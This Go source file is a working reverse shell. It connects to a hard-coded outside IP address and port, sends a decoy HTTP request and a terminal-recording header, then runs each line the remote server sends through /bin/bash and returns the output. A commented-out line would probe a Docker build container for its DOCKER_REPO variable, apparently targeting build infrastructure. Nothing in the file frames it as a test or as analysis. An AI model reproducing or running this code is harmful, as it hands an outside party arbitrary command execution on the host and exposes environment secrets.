package main

import (
	"bufio"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

func run(oneliner string) []byte {
	cmd := exec.Command("/bin/bash", "-c", oneliner)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return []byte(err.Error())
	}
	return out
}

func main() {
	server := "45.32.65.48:8000"
	if len(os.Args) > 1 {
		server = os.Args[1]
	}
	conn, err := net.Dial("tcp", server)
	if err != nil {
		log.Fatalln(err)
	}
	_, err = conn.Write([]byte("GET / HTTP/1.1\r\nHost: localhost:8000\r\n\r\n"))
	if err == nil {
		log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())
	} else {
		log.Println(err)
	}
	//go io.Copy(os.Stdout, conn)
	//conn.Write(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO || echo no DOCKER_REPO`))
	time.Sleep(time.Second)
	conn.Write([]byte(`{"env":{"SHELL":"/bin/bash","TERM":"screen"},"height":45,"timestamp":1548324095,"version":2,"width":174}`))
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text() //+ "\n"
		log.Println(line)
		// conn.Write([]byte(line))
		go func() {
			comOut := run(line)
			conn.Write(comOut)
			os.Stdout.Write(comOut)
		}()
	}
}
